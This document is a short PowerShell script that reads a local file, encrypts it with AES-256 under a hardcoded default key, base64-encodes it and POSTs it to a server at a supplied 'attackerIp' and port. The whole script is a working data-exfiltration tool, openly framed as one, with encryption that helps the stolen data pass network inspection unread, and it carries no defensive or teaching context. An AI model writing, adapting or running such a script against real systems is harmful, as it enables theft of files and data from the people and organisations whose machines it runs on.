# Define command line parameters
param(
    [string]$attackerIp,
    [int]$port,
    [string]$filePath = ".\cat.jpg",
    [string]$encryptionKey = "0123456789abcdef0123456789abcdef"
)

# Validate parameters
if (-not $attackerIp -or -not $port) {
    Write-Host "Usage: .\script.ps1 -attackerIp <IP> -port <Port> [-filePath <Path>] [-encryptionKey <Key>]"
    exit 1
}

# Resolve relative paths to absolute paths
$filePath = Resolve-Path $filePath | Select-Object -ExpandProperty Path

# Validate file path
if (-not (Test-Path $filePath)) {
    Write-Host "File not found: $filePath"
    exit 1
}

# Define the remote server URL
$serverUrl = "http://${attackerIp}:${port}/receive"

# Validate encryption key length (must be 32 bytes for AES-256)
if ($encryptionKey.Length -ne 32) {
    Write-Host "Error: Encryption key must be 32 characters long."
    exit 1
}

# Convert encryption key to bytes
$key = (New-Object System.Text.ASCIIEncoding).GetBytes($encryptionKey)

# Read the file as binary data
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)

# Initialize AES encryption
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

# Generate a random Initialization Vector (IV)
$aes.GenerateIV()
$iv = $aes.IV

# Create an encryptor and encrypt the file data
$encryptor = $aes.CreateEncryptor()
$encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)

# Combine IV and encrypted data
$encryptedData = $iv + $encryptedBytes

# Convert the encrypted data to Base64
$encryptedBase64 = [Convert]::ToBase64String($encryptedData)

# Send the encrypted data to the remote server
try {
    $response = Invoke-WebRequest -Uri $serverUrl -Method POST -Body $encryptedBase64 -ContentType "text/plain"
    Write-Host "Server Response: $($response.StatusCode) $($response.StatusDescription)"
} catch {
    Write-Host "Error sending data: $_"
}
